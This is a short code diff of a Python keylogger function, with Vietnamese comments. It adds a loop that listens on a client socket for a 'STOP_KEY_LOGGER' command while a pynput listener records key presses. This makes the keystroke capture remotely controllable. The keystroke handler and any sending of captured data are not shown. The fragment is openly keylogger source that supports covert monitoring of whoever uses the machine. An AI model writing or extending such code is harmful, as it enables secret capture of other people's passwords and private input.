@@ -43,12 +43,19 @@ def start_keylogger(client_socket):
     #         print("\nKeylogger stopped by user.")
     #         return False  # Dừng listener
 
-    # Bắt đầu lắng nghe sự kiện phím nhấn và thả
+    # Bắt đầu lắng nghe sự kiện phím nhấn và thả    
     with keyboard.Listener(on_press=on_press) as listener:
         try:
-            listener.join()  # Chờ cho listener hoàn thành
+            # Kiểm tra lệnh từ client trong khi lắng nghe phím
+            while listener.running:
+                data = client_socket.recv(1024)
+                command = data.decode("utf-8")
+                if command == "STOP_KEY_LOGGER":
+                    print("\nReceived stop command from client. Stopping keylogger...")
+                    listener.stop()  # Dừng listener
+                    break
         except Exception as e:
-            print(f"Error in listener: {e}")
+            print(f"Error in listener or receiving command: {e}")
             
     # Lắng nghe lệnh từ client để dừng keylogger
     try:
